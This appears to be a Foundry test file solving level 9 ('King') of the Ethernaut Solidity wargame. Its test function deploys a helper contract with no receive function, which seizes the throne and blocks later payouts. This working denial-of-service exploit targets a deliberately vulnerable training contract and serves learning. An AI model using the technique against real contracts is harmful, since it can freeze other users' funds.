// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./base/EthernautTest.sol";

// Set actual level contract file
import "../../src/9_King.sol";

contract LevelTest is EthernautTest {

    function setUp() public {
        // Set actual level factory address
        levelSetUp(LEVEL_9_KING_ADDRESS, 0);

        // Additional setup
    }

    function testAttack() public validateInstance {
        King king = King(levelInstance);
        
        (bool result, ) = address(king).call{value: 1 ether}("");
        require(result, "call failed");

        new SendEther{value: 1 ether}(payable(address(king)));
    }
}

contract SendEther {
    constructor(address payable target) payable {
        (bool result, ) = address(target).call{value: msg.value}("");
        require(result, "call failed");
    }
}